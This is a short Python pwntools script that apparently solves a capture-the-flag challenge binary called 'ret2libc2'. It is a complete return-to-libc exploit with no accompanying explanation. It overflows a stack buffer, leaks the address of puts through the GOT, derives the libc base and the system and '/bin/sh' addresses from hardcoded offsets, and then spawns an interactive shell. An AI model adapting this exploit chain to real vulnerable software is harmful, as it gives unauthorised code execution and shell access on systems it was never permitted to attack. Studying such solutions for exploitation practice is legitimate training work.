from pwn import *
p = process("./ret2libc2")
offset = 112
puts_plt = 0x8048460
main_addr = 0x8048618
puts_got = 0x804a018
p.recvuntil(b"Can you find it !?")
payload1 = b"A"*112 + p32(puts_plt) + p32(main_addr) + p32(puts_got)
p.sendline(payload1)
puts_true = u32(p.recv(4))
libc_addr = puts_true - 0x78140
system_addr = libc_addr + 0x50430
binsh_addr = libc_addr + 0x1c4de8
#gdb.attach(p)
#p.sendline(cyclic(200))
p.recvuntil(b"Can you find it !?")
payload2 = b"a"*104 + p32(system_addr) + b"XXXX" + p32(binsh_addr)
p.sendline(payload2)
p.interactive()
